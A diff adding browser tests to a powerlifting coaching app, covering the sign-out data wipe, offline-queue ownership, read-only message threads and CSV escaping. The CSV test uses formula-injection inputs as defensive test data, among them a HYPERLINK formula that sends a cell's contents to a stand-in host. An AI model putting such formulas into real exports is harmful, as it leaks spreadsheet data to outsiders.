@@ -8096,6 +8096,253 @@ test('demo card: Turn on and Not now write nothing and ask for nothing', () => {
   }
 });
 
+/* ===========================================================
+   Sign-out wipe, the offline queue's owner, CSV cells (security sweep 2026-10-28 #4, #6, #7).
+   These touch this browser's own storage (admin.html runs this page on the live site): every
+   powa-* and sb-* key is put back exactly as it was, and nothing here sends anything.
+   =========================================================== */
+group('sign-out wipe, offline queue owner, CSV cells (security)');
+(() => {
+  const lsKeys = () => { const a = []; for (let i = 0; i < localStorage.length; i++) a.push(localStorage.key(i)); return a; };
+  const keep = {};
+  lsKeys().forEach(k => { if (/^(powa-|sb-)/.test(k)) keep[k] = localStorage.getItem(k); });
+  const realUser = window._user, realDB = typeof DB === 'undefined' ? undefined : DB, realOut = window._signingOut;
+  const put = (k, v) => localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+  const clearQueues = () => [_PENDING_LOGS_KEY, _PENDING_ATTEMPTS_KEY, _OUTBOX_KEY, _OUTBOX_ATTEMPTS_KEY, _QUEUE_OWNER_KEY].forEach(k => localStorage.removeItem(k));
+  const queueOne = () => { clearQueues(); put(_PENDING_LOGS_KEY, [{ id: 'sec-l1', athleteId: 'sec-a', lift: 'squat', weight: 100, reps: 5, rpe: 8, date: '2026-10-28' }]); put(_OUTBOX_KEY, [{ key: 'bw:sec-a:2026-10-28', kind: 'bw', payload: { athleteId: 'sec-a', date: '2026-10-28', weight: 80 }, ts: 1 }]); };
+  try {
+    test('a log-out, deletion or refused session in progress writes no snapshot back (#4)', () => {
+      localStorage.removeItem('powa-snapshot-sec-a');
+      window._signingOut = true;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      eq(localStorage.getItem('powa-snapshot-sec-a'), null, 'written while signing out');
+      window._signingOut = false;
+      _saveSnapshot({ id: 'sec-a', name: 'A' }, { athletes: [] });
+      assert(!!localStorage.getItem('powa-snapshot-sec-a'), 'an ordinary save still works');
+      localStorage.removeItem('powa-snapshot-sec-a');
+    });
+    test('a sign-out sweeps the private keys (snapshots, names, notes, Health readings, intake, billing, sent boards); device settings stay (#6)', () => {
+      const gone = ['powa-snapshot-sec-a', 'powa-snapshot-sec-b', 'powa-intake-draft-sec-a', 'powa-intake-sec-a', 'powa-health-recovery-sec-a', 'powa-health-food-sec-a',
+        'powa-health-sleep-sec-a', 'powa-cut-sec-a', 'powa-ds-names', 'powa-coach-notes-sec-c', 'powa-client-billing-sec-c', 'powa-teams-sec-c',
+        'powa-fca-sec-f', 'powa-ready-2026-10-28', 'powa-challenges-sec-c', 'powa-busy-week-sec-a', 'powa-attempt-plans', 'powa-club-board', 'powa-club-stats', 'powa-club-name',
+        'powa-md-demo-srv', 'powa-md-local-sec'];
+      const stay = { 'powa-theme': 'dark', 'powa-unit': 'kg', 'powa-desk-theme': 'light', 'powa-card-format': 'story', 'powa-consent': 'all', 'powa-desk-rail': '1', 'powa-push-off': '1' };
+      Object.keys(stay).forEach(k => put(k, stay[k]));
+      gone.forEach(k => put(k, '{"secret":"Priya, knee 7/10"}'));
+      put('powa-md-sent-board', { day: { name: 'Club meet', status: 'done' }, lifters: [{ name: 'Priya' }], cells: { a: 1 }, outbox: {}, dirtyLifters: {}, dirtyDay: false, pendingCreate: false });
+      put('powa-md-demo-md-1', { day: {}, lifters: [], cells: {}, outbox: { a: 1 } });   // the demo's board never counts as unsent work
+      assert(_sweepAccountKeys() >= gone.length + 2, 'counted');
+      gone.concat(['powa-md-sent-board', 'powa-md-demo-md-1']).forEach(k => eq(localStorage.getItem(k), null, k + ' left behind'));
+      Object.keys(stay).forEach(k => eq(localStorage.getItem(k), stay[k], k + ' (a setting) removed'));
+    });
+    test('every sign-out keeps the account\'s own settings and records: saved replies, weekly-note records, the OpenPowerlifting link, the Health switch and its bookkeeping', () => {
+      const own = ['powa-saved-replies-sec-c', 'powa-weekly-notes-sec-c', 'powa-week-changes-sec-c', 'powa-opl-sec-a', 'powa-health-on-sec-a', 'powa-health-access-sec-a',
+        'powa-health-decided-sec-a', 'powa-health-imported-sec-a', 'powa-health-sessions-sec-a', 'powa-health-share-sec-a', 'powa-health-share-food-sec-a',
+        'powa-health-share-off-pending-sec-a', 'powa-health-since-sec-a', 'powa-health-times-sec-a'];
+      own.forEach(k => put(k, '"kept"'));
+      own.forEach(k => eq(_accountKeyKind(k), 'own', k));
+      eq(_accountKeyKind('powa-health-recovery-sec-a'), 'private', 'sleep and heart readings are private');
+      eq(_accountKeyKind('powa-health-food-sec-a'), 'private', 'food readings are private');
+      eq(_accountKeyKind('powa-theme'), null, 'a device setting is no account key');
+      window._user = { id: 'sec-a' };
+      _wipeLocalUserData({ uid: 'sec-a' }); _sweepAccountKeys({ pending: true });   // a chosen log-out
+      _wipeLocalUserData({ uid: 'sec-a', keepQueue: true }); _sweepAccountKeys();     // a sign-out nobody chose
+      own.forEach(k => eq(localStorage.getItem(k), '"kept"', k + ' removed by a sign-out'));
+      own.forEach(k => localStorage.removeItem(k));
+    });
+    test('the coach\'s saved replies and the lifter\'s Health switch come back for the same account after a log-out (review of #6)', () => {
+      const was = window._demoMode; window._demoMode = false;
+      try {
+        const cid = 'sec-coach-0001-aaaa', lid = 'sec-lift-0001-bbbb';
+        window._user = { id: cid };
+        WeeklyNote.saveReplies(cid, ['Custom: film the top set'].concat(WeeklyNote.DEFAULT_REPLIES));
+        _wipeLocalUserData({ uid: cid }); window._user = null; _sweepAccountKeys({ pending: true });
+        window._user = { id: cid };
+        eq(WeeklyNote.loadReplies(cid)[0], 'Custom: film the top set', 'the coach\'s own reply is still there');
+        window._user = { id: lid };
+        put('powa-health-on-' + lid, true); put('powa-health-imported-' + lid, { 'bw-1': 81.2 });
+        put('powa-health-recovery-' + lid, { day: '2026-10-28', sleepMin: 410, rhr: 52 }); put('powa-opl-' + lid, { u: 'lifterlo', name: 'Lifter Lo' });
+        eq(PowaHealthJS.isOn(), true, 'on before');
+        _wipeLocalUserData({ uid: lid, keepQueue: true }); window._user = null; _sweepAccountKeys();
+        window._user = { id: lid };
+        eq(PowaHealthJS.isOn(), true, 'Apple Health is still on for them');
+        eq(PowaHealthJS.fromHealth({ id: 'bw-1', weight: 81.2 }), true, 'a weigh-in from Health is still known as one (never written back)');
+        eq(localStorage.getItem('powa-health-recovery-' + lid), null, 'last night\'s readings went');
+        assert(!!localStorage.getItem('powa-opl-' + lid), 'the OpenPowerlifting link stays');
+        window._user = { id: 'sec-other-9999-cccc' };
+        eq(PowaHealthJS.isOn(), false, 'another account on this device never gets their switch');
+        [WeeklyNote.repliesKey(cid), 'powa-health-on-' + lid, 'powa-health-imported-' + lid, 'powa-opl-' + lid].forEach(k => localStorage.removeItem(k));
+      } finally { window._demoMode = was; }
+    });
+    test('a deleted account takes every key that names it, and no other account\'s (#4)', () => {
+      const me = 'sec-del-0000-1111', other = 'sec-oth-0000-2222';
+      const mine = ['powa-saved-replies-' + me, 'powa-health-on-' + me, 'powa-health-times-' + me, 'powa-opl-' + me, 'powa-desk-pend-' + me, 'powa-desk-review-' + me,
+        'powa-pb-pub-' + me + '-prog-1', 'powa-signals-read-' + me, 'powa-coach-style-' + me, 'powa-snapshot-' + me];
+      const theirs = ['powa-saved-replies-' + other, 'powa-health-on-' + other, 'powa-desk-pend-' + other];
+      mine.concat(theirs).forEach(k => put(k, '"x"')); put('powa-theme', 'dark');
+      put('powa-md-unsent-del', { day: {}, lifters: [], cells: {}, outbox: { a: 1 } });
+      _wipeLocalUserData({ uid: me, deleted: true });
+      mine.concat(['powa-md-unsent-del']).forEach(k => eq(localStorage.getItem(k), null, k + ' left behind'));
+      theirs.forEach(k => eq(localStorage.getItem(k), '"x"', k + ' (another account\'s) removed'));
+      eq(localStorage.getItem('powa-theme'), 'dark');
+      eq(_forgetAccountKeys('a'), 0, 'never on a short id');
+      theirs.forEach(k => localStorage.removeItem(k));
+    });
+    test('an unsent meet-day board stays for its account through a sign-out it didn\'t choose; another account signing in drops it (review of #6)', () => {
+      clearQueues();
+      const coach = 'sec-md-coach-0001';
+      const unsent = { day: { name: 'Club meet' }, lifters: [{ name: 'Priya' }], cells: { a: 1 }, outbox: { a: 1 }, dirtyLifters: {}, pendingCreate: false };
+      put('powa-md-board-unsent', unsent);
+      put('powa-md-board-new', { day: { name: 'Open' }, lifters: [], cells: {}, outbox: {}, pendingCreate: true });
+      put('powa-md-board-lifter', { day: {}, lifters: [], cells: {}, outbox: {}, dirtyLifters: { l1: { _new: true } } });
+      put('powa-md-board-sent', { day: { status: 'done' }, lifters: [{ name: 'Priya' }], cells: {}, outbox: {} });
+      put('powa-md-local-' + coach, [{ id: 'board-new', name: 'Open', pending: true }]);
+      eq(_pendingBoardCount(), 3, 'three boards still have something to send');
+      eq(_queueHasItems(), true, 'they count as unsent work');
+      window._user = { id: coach };
+      _wipeLocalUserData({ uid: coach, keepQueue: true }); window._user = null; _sweepAccountKeys();
+      ['powa-md-board-unsent', 'powa-md-board-new', 'powa-md-board-lifter', 'powa-md-local-' + coach].forEach(k => assert(!!localStorage.getItem(k), k + ' dropped'));
+      eq(localStorage.getItem('powa-md-board-sent'), null, 'a board with nothing to send goes');
+      eq(_queueOwner(), coach, 'tagged with its account');
+      _reconcileQueueOwner(coach);
+      eq(_pendingBoardCount(), 3, 'the same coach signs back in: still there');
+      _reconcileQueueOwner('sec-someone-else-0002');
+      eq(_pendingBoardCount(), 0, 'another account: dropped'); eq(localStorage.getItem('powa-md-local-' + coach), null); eq(_queueOwner(), null);
+      put('powa-md-board-unsent', unsent);
+      _wipeLocalUserData({ uid: coach });
+      eq(localStorage.getItem('powa-md-board-unsent'), null, 'a chosen log-out (after asking) takes it');
+      put(_QUEUE_OWNER_KEY, 'sec-gone-0003');
+      _reconcileQueueOwner(coach);
+      eq(_queueOwner(), null, 'a tag with nothing under it just goes');
+    });
+    test('what the log-out question and the signed-out note say about a meet-day board', () => {
+      eq(_unsyncedWords({ sets: 0, changes: 0, boards: 1 }), '1 meet-day board');
+      eq(_unsyncedWords({ sets: 2, changes: 1, boards: 1 }), '2 sets, 1 change and 1 meet-day board');
+      eq(signedOutNoteText({ sets: 1, changes: 1 }), 'You were signed out. 1 set and 1 change wait on this device and sync when you log back in.');
+      eq(signedOutNoteText({ sets: 0, changes: 0, boards: 1 }), 'You were signed out. 1 meet-day board waits on this device for when you log back in.');
+      eq(signedOutNoteText({ sets: 2, boards: 1 }), 'You were signed out. 2 sets and 1 meet-day board wait on this device for when you log back in.');
+      eq(signedOutNoteText({}), 'You were signed out. Log in to carry on.');
+    });
+    test('the one snapshot on the device names the queue\'s owner; two say nothing', () => {
+      lsKeys().filter(k => /^powa-snapshot-/.test(k)).forEach(k => localStorage.removeItem(k));
+      put('powa-snapshot-sec-a', '{}');
+      eq(_lastSnapshotUid(), 'sec-a');
+      put('powa-snapshot-sec-b', '{}');
+      eq(_lastSnapshotUid(), null);
+      localStorage.removeItem('powa-snapshot-sec-a'); localStorage.removeItem('powa-snapshot-sec-b');
+    });
+    test('a chosen log-out takes the queues; a sign-out the person didn\'t choose keeps them, tagged with the account (#6)', () => {
+      window._user = { id: 'sec-a' };
+      queueOne();
+      _wipeLocalUserData({ uid: 'sec-a', keepQueue: true });
+      eq(_readPendingLogs().length, 1, 'sets kept'); eq(_readOutbox().length, 1, 'changes kept');
+      eq(_queueOwner(), 'sec-a', 'tagged');
+      _wipeLocalUserData({ uid: 'sec-a' });
+      eq(_readPendingLogs().length, 0, 'sets dropped'); eq(_readOutbox().length, 0, 'changes dropped'); eq(_queueOwner(), null, 'tag dropped');
+    });
+    test('the queue counts and sends only for its own account, never while nobody is signed in (#6)', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      let sent = 0;
+      window.DB = { addLog: () => { sent++; return Promise.resolve(); }, upsertBw: () => { sent++; return Promise.resolve(); } };
+      window._user = null;
+      eq(_queueIsMine(), false); eq(_pendingCount(), 0); eq(powaSyncState().sets, 0);
+      flushPendingLogs(); flushOutbox();
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), false, 'another account'); eq(_pendingCount(), 0); eq(powaSyncState().changes, 0);
+      flushPendingLogs(); flushOutbox();
+      eq(sent, 0, 'sent as someone else');
+      window._user = { id: 'sec-a' };
+      eq(_queueIsMine(), true); eq(_pendingCount(), 2);
+      const st = powaSyncState(); eq(st.sets, 1); eq(st.changes, 1);
+      localStorage.removeItem(_QUEUE_OWNER_KEY);
+      window._user = { id: 'sec-b' };
+      eq(_queueIsMine(), true, 'a queue from before the tag goes to whoever signs in next, as before');
+      clearQueues();
+    });
+    test('another account signing in drops the old queue; the same account keeps it; queueing claims it', () => {
+      queueOne(); put(_QUEUE_OWNER_KEY, 'sec-a');
+      _reconcileQueueOwner('sec-a');
+      eq(_readPendingLogs().length, 1, 'same account: kept');
+      _reconcileQueueOwner('sec-b');
+      eq(_readPendingLogs().length, 0, 'other account: dropped'); eq(_readOutbox().length, 0); eq(_queueOwner(), null);
+      clearQueues();
+      window._user = { id: 'sec-b' };
+      _queuePendingLog({ id: 'sec-l2', athleteId: 'sec-b' });
+      eq(_queueOwner(), 'sec-b', 'claimed when queued');
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), 'sec-b', 'a tag is never moved');
+      clearQueues();
+      _tagQueueOwner('sec-z');
+      eq(_queueOwner(), null, 'nothing queued: no tag');
+    });
+    test('words for what still waits', () => {
+      eq(_unsyncedWords({ sets: 1, changes: 0 }), '1 set');
+      eq(_unsyncedWords({ sets: 3, changes: 2 }), '3 sets and 2 changes');
+      eq(_unsyncedWords({ sets: 0, changes: 1 }), '1 change');
+    });
+    test('a deleted account (no profile row) counts as refused; a network blip never does', () => {
+      eq(_isAuthError(new Error('Profile not found for 1234')), true);
+      eq(_isAuthError({ status: 401 }), true);
+      eq(_isAuthError(new TypeError('Failed to fetch')), false);
+      eq(_isAuthError(Object.assign(new Error('timeout'), { transient: true })), false);
+    });
+    test('CSV cells: a name that starts like a formula stays text, numbers stay numbers (#7)', () => {
+      eq(_csvEscape('=1+1'), "'=1+1");
+      eq(_csvEscape('=HYPERLINK("https://example.invalid/?d="&B3,"Arjun")'), '"\'=HYPERLINK(""https://example.invalid/?d=""&B3,""Arjun"")"');
+      eq(_csvEscape('@SUM(1,1)'), '"\'@SUM(1,1)"');
+      eq(_csvEscape('-2+3'), "'-2+3");
+      eq(_csvEscape('+1 call me'), "'+1 call me");
+      eq(_csvEscape('\t=1'), "'\t=1");
+      eq(_csvEscape('220.00'), '220.00');
+      eq(_csvEscape('-5.00'), '-5.00');
+      eq(_csvEscape('Arjun Mehta'), 'Arjun Mehta');
+    });
+  } finally {
+    window._user = realUser; window.DB = realDB; window._signingOut = realOut;
+    lsKeys().filter(k => /^(powa-|sb-)/.test(k) && !(k in keep)).forEach(k => localStorage.removeItem(k));
+    Object.keys(keep).forEach(k => localStorage.setItem(k, keep[k]));
+  }
+})();
+
+/* ===========================================================
+   A thread without a live coach-lifter link is read-only (row 59: a former coach, or a lifter who left,
+   reads the thread but can't send, react or mark read). Pure: who's asking and the roster are passed in.
+   =========================================================== */
+group('messages: a thread without a live link is read-only (row 59)');
+test('the lifter: live only with the coach they have now', () => {
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: 'c1' }), true);
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: null }), false, 'left their coach');
+  eq(msgThreadLive('c1', 'a1', { id: 'a1', coachId: 'c2' }), false, 'a new coach: the old thread is read-only');
+});
+test('the coach: live only for a lifter on their roster who is linked to them', () => {
+  const roster = [{ id: 'a1', coachId: 'c1' }, { id: 'a2', coachId: 'c1' }];
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, roster), true);
+  eq(msgThreadLive('c1', 'a9', { id: 'c1' }, roster), false, 'not on the roster (released, or left)');
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, [{ id: 'a1', coachId: 'c2' }]), false, 'on a stale list under another coach');
+  eq(msgThreadLive('c1', 'a1', { id: 'c1' }, []), false, 'nobody yet');
+});
+test('anyone else, or nothing to go on: not live', () => {
+  eq(msgThreadLive('c1', 'a1', { id: 'x9', coachId: 'c1' }, [{ id: 'a1', coachId: 'c1' }]), false, 'not in the thread');
+  eq(msgThreadLive('c1', 'a1', null), false, 'signed out');
+  eq(msgThreadLive('', 'a1', { id: 'a1', coachId: '' }), false, 'no coach id');
+});
+test('a refusal because the link ended is told apart from a hiccup', () => {
+  eq(msgLinkRefused({ code: '42501', message: 'new row violates row-level security policy for table "messages"' }), true);
+  eq(msgLinkRefused(new Error('new row violates row-level security policy for table "message_reactions"')), true, 'reactions (the message only)');
+  eq(msgLinkRefused(Object.assign(new Error('x'), { linkGone: true })), true, 'voice.js marks it');
+  eq(msgLinkRefused({ statusCode: '403', message: 'new row violates row-level security policy' }), true, 'storage (a voice note upload)');
+  eq(msgLinkRefused(new TypeError('Failed to fetch')), false);
+  eq(msgLinkRefused({ code: 'PGRST301', message: 'JWT expired' }), false);
+  eq(msgLinkRefused({ code: '23505', message: 'duplicate key value' }), false);
+  eq(msgLinkRefused(null), false);
+});
+test('what the read-only thread says, from either side', () => {
+  eq(msgClosedText(true, 'Maya'), 'Maya is no longer on your roster, so this thread is read-only.');
+  eq(msgClosedText(false, 'Alex'), 'Alex is no longer your coach, so this thread is read-only.');
+  eq(msgClosedText(true, ''), 'This lifter is no longer on your roster, so this thread is read-only.');
+  eq(msgClosedText(false, null), 'This coach is no longer your coach, so this thread is read-only.');
+});
+
 function render() {
   const sum = document.getElementById('summary');
   const total = T.pass + T.fail + T.skip;
